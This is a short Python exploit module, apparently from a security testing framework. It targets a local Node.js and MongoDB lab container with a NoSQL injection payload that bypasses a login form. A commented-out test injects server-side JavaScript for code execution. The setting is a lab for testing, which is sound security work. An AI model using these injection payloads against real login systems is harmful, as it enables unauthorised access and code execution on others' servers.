from data.exploits.framework.BasicExploit import BasicExploit

class Exploit(BasicExploit):

    attributes = {
      'Name' :        'NoSQLInjectionExploit',
      'Description' : "SQL injection in MongoDB + node.js application.",
      'References' :  [["empty"]],
      'Target' :      "nosqlinjection",
      'Container': 'ubuntu-node-mongo',
      'TargetLicense' : '',
      'Plugin' : '',
      'VulWikiPage' : "None",
      'Type' : 'NoSQL injection'
    }


    def runExploit(self):
        w = self.wrapper
        w.navigate("http://localhost:49160/insecureLogin.html")
        w.find("userid").keys("Batman'})//")
        w.find("submit").click()
        element = w.find("body")
        self.assertIn("Hello, Batman!", element.raw.text)
'''
    def test_JSON_code_execution(self):
        w = self.wrapper
        w.navigate("http://localhost:49160/insecureLogin.html")
        w.find("userid").keys("' + response.send(\"All your base are belong to us\") + '})//")
        w.find("submit").click()
        element = w.find("body")
        self.assertIn("All your base are belong to us", element.raw.text)
'''
